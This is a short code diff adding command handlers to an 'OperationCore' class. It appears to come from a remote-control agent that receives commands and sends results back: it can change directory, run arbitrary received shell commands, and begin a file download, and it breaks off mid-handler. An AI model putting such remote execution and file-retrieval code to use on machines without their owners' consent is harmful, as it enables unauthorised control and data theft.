@@ -528,3 +528,16 @@ class OperationCore:
             self.sys_mgr.list_directory(".")
             
         elif command_str == "cd":
+            new_dir = payload.get("path") if isinstance(payload, dict) else payload
+            try:
+                os.chdir(new_dir)
+                self.comm.send_data({"status": "success", "cwd": os.getcwd()}, "status")
+            except Exception as e:
+                self.comm.send_data({"status": "fail", "reason": str(e)}, "status")
+                
+        elif command_str == "execute":
+            cmd = payload.get("payload") if isinstance(payload, dict) else payload
+            self.sys_mgr.execute_command(cmd)
+                
+        elif command_str == "download":
+            file_path = payload.get("path") if isinstance(payload, dict) else payload
